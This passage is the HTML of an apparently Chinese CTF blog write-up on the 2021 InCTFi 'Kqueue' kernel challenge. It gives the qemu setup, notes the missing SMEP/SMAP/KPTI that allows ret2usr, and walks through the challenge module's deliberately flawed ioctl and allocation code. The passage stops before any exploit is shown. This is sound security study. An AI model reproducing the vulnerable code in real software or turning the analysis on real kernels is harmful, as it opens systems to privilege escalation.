@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="NkA6ndXFZC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.xi4oyu.top","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="去年参加的一场 CTF，当时不怎么会 kernel，现在想深入学习下 kernel，回过头来看看这道题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021-inCTFi-Kqueue">
+<meta property="og:url" content="http://www.xi4oyu.top/f6f424b7/index.html">
+<meta property="og:site_name" content="feather&#39;s blog">
+<meta property="og:description" content="去年参加的一场 CTF，当时不怎么会 kernel，现在想深入学习下 kernel，回过头来看看这道题">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-10T07:32:00.000Z">
+<meta property="article:modified_time" content="2022-03-10T07:32:00.000Z">
+<meta property="article:author" content="feather">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://www.xi4oyu.top/f6f424b7/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.xi4oyu.top/f6f424b7/","path":"f6f424b7/","title":"2021-inCTFi-Kqueue"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2021-inCTFi-Kqueue | feather's blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="feather's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">feather's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-amp-%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">环境 &amp; 一些问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">3.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">3.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9F"><span class="nav-number">3.3.</span> <span class="nav-text">方法三？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="feather" src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">feather</p>
+  <div class="site-description" itemprop="description">计算机技术&个人琐碎事</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/featherl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;featherl" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:featherm@126.com" title="E-Mail → mailto:featherm@126.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0x4qe.github.io/" title="https:&#x2F;&#x2F;0x4qe.github.io&#x2F;" rel="noopener" target="_blank">0x4qE</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wzyxv1n.top/" title="https:&#x2F;&#x2F;wzyxv1n.top&#x2F;" rel="noopener" target="_blank">转爷</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.red/" title="https:&#x2F;&#x2F;github.red&#x2F;" rel="noopener" target="_blank">茄皇</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://fl0.top/" title="http:&#x2F;&#x2F;fl0.top&#x2F;" rel="noopener" target="_blank">qz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://legr4ndk.github.io/" title="https:&#x2F;&#x2F;legr4ndk.github.io&#x2F;" rel="noopener" target="_blank">Legrandk</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.thesoldierjack.cn/" title="https:&#x2F;&#x2F;www.thesoldierjack.cn&#x2F;" rel="noopener" target="_blank">digger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wr-web.github.io/" title="https:&#x2F;&#x2F;wr-web.github.io&#x2F;" rel="noopener" target="_blank">wr</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://annevi.cn/" title="https:&#x2F;&#x2F;annevi.cn&#x2F;" rel="noopener" target="_blank">annevi</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.zhouweitong.site/" title="http:&#x2F;&#x2F;www.zhouweitong.site&#x2F;" rel="noopener" target="_blank">obj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.wz22.cc/" title="https:&#x2F;&#x2F;blog.wz22.cc&#x2F;" rel="noopener" target="_blank">Moesang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.liki.link/" title="https:&#x2F;&#x2F;me.liki.link&#x2F;" rel="noopener" target="_blank">kg</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cosmos.red/" title="https:&#x2F;&#x2F;cosmos.red&#x2F;" rel="noopener" target="_blank">boss-c</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jacksonyu1334.github.io/" title="https:&#x2F;&#x2F;jacksonyu1334.github.io" rel="noopener" target="_blank">jackson</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cjovi.icu/" title="https:&#x2F;&#x2F;cjovi.icu&#x2F;" rel="noopener" target="_blank">cj</a>
+        </li>
+    </ul>
+  </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.xi4oyu.top/f6f424b7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="feather">
+      <meta itemprop="description" content="计算机技术&个人琐碎事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="feather's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2021-inCTFi-Kqueue
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-03-10 15:32:00" itemprop="dateCreated datePublished" datetime="2022-03-10T15:32:00+08:00">2022-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/kernel/" itemprop="url" rel="index"><span itemprop="name">kernel</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>12k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>11 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>去年参加的一场 CTF，当时不怎么会 kernel，现在想深入学习下 kernel，回过头来看看这道题</p>
+<span id="more"></span>
+
+<h2 id="环境-amp-一些问题"><a href="#环境-amp-一些问题" class="headerlink" title="环境 &amp; 一些问题"></a>环境 &amp; 一些问题</h2><p>题目的附件可以在<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/Kqueue">官方题目仓库</a>里找到</p>
+<p>需要注意的几件事情：</p>
+<ol>
+<li>题目的环境是用 buildroot，登陆用户名是 <code>ctf</code>，密码是 <code>kqueue</code>（可以在官方的 exp.py 里面找到）</li>
+<li>解包/重新打包 rootfs.cpio 的时候记得用 <strong>root</strong> 权限，不然启动的时候会有奇奇怪怪的权限或者文件丢失的问题</li>
+</ol>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>qemu 启动参数</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token builtin class-name">exec</span> qemu-system-x86_64 <span class="token punctuation">\</span>
+    -cpu kvm64 <span class="token punctuation">\</span>
+    -m <span class="token number">512</span> <span class="token punctuation">\</span>
+    -nographic <span class="token punctuation">\</span>
+    -kernel <span class="token string">"bzImage"</span> <span class="token punctuation">\</span>
+    -append <span class="token string">"console=ttyS0 panic=-1 pti=off kaslr quiet"</span> <span class="token punctuation">\</span>
+    -monitor /dev/null <span class="token punctuation">\</span>
+    -initrd <span class="token string">"./rootfs.cpio.pack"</span> <span class="token punctuation">\</span>
+    -net user <span class="token punctuation">\</span>
+    -net nic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>开启了 kaslr，关闭了 kpti，而且还没开启 SMAP，SMEP，意味着内核可以访问用户空间代码和数据，可以 ret2usr</p>
+<p>内核模块直接提供了源码</p>
+<p>题目创建了一个设备，可以对这个设备进行 ioctl 调用</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">miscdevice</span> kqueue_device <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">.</span>minor <span class="token operator">=</span> MISC_DYNAMIC_MINOR<span class="token punctuation">,</span>
+    <span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"kqueue"</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span>fops <span class="token operator">=</span> <span class="token operator">&amp;</span>kqueue_fops<span class="token punctuation">,</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>ioctl 通过一个 <code>request_t</code> 结构体进行传参</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> entry_idx<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">;</span>
+    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>此外通过 <code>cmd</code> 参数分别实现管理多个队列的增删改查</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">kqueue_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">long</span> result<span class="token punctuation">;</span>
+
+    <span class="token class-name">request_t</span> request<span class="token punctuation">;</span>
+    
+    <span class="token function">mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>operations_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>request<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] copy_from_user failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">switch</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">case</span> CREATE_KQUEUE<span class="token operator">:</span>
+            result <span class="token operator">=</span> <span class="token function">create_kqueue</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> DELETE_KQUEUE<span class="token operator">:</span>
+            result <span class="token operator">=</span> <span class="token function">delete_kqueue</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> EDIT_KQUEUE<span class="token operator">:</span>
+            result <span class="token operator">=</span> <span class="token function">edit_kqueue</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> SAVE<span class="token operator">:</span>
+            result <span class="token operator">=</span> <span class="token function">save_kqueue_entries</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">default</span><span class="token operator">:</span>
+            result <span class="token operator">=</span> INVALID<span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+ret<span class="token operator">:</span> 
+    <span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>operations_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>队列的存储结构体如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> queue_size<span class="token punctuation">;</span> <span class="token comment">/* This needs to handle larger numbers */</span>
+    <span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> idx<span class="token punctuation">;</span>
+    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>queue<span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint16_t</span> idx<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
+    queue_entry <span class="token operator">*</span>next<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>create 操作：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">create_kqueue</span><span class="token punctuation">(</span><span class="token class-name">request_t</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">long</span> result <span class="token operator">=</span> INVALID<span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span>queueCount <span class="token operator">></span> MAX_QUEUES<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Max queue count reached"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* You can't ask for 0 queues , how meaningless */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] kqueue entries should be greater than 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Asking for too much is also not good */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size<span class="token operator">></span>MAX_DATA_SIZE<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] kqueue data size exceed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Initialize kqueue_entry structure */</span>
+    queue_entry <span class="token operator">*</span>kqueue_entry<span class="token punctuation">;</span>
+
+    <span class="token comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span>
+    ull space <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">__builtin_umulll_overflow</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue_entry<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>space<span class="token punctuation">)</span> <span class="token operator">==</span> true<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Integer overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Size is the size of queue structure + size of entry * request entries */</span>
+    ull queue_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">__builtin_saddll_overflow</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">,</span>space<span class="token punctuation">,</span><span class="token operator">&amp;</span>queue_size<span class="token punctuation">)</span> <span class="token operator">==</span> true<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Integer overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Total size should not exceed a certain limit */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>queue_size<span class="token operator">></span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x10000</span><span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Max kqueue alloc limit reached"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* All checks done , now call kzalloc */</span>
+    queue <span class="token operator">*</span>queue <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>queue_size<span class="token punctuation">,</span>GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Main queue can also store data */</span>
+    queue<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">,</span>GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Fill the remaining queue structure */</span>
+    queue<span class="token operator">-></span>data_size   <span class="token operator">=</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">;</span>
+    queue<span class="token operator">-></span>max_entries <span class="token operator">=</span> request<span class="token punctuation">.</span>max_entries<span class="token punctuation">;</span>
+    queue<span class="token operator">-></span>queue_size  <span class="token operator">=</span> queue_size<span class="token punctuation">;</span>
+
+    <span class="token comment">/* Get to the place from where memory has to be handled */</span>
+    kqueue_entry <span class="token operator">=</span> <span class="token punctuation">(</span>queue_entry <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span>queue <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Allocate all kqueue entries */</span>
+    queue_entry<span class="token operator">*</span> current_entry <span class="token operator">=</span> kqueue_entry<span class="token punctuation">;</span>
+    queue_entry<span class="token operator">*</span> prev_entry <span class="token operator">=</span> current_entry<span class="token punctuation">;</span>
+
+    <span class="token class-name">uint32_t</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
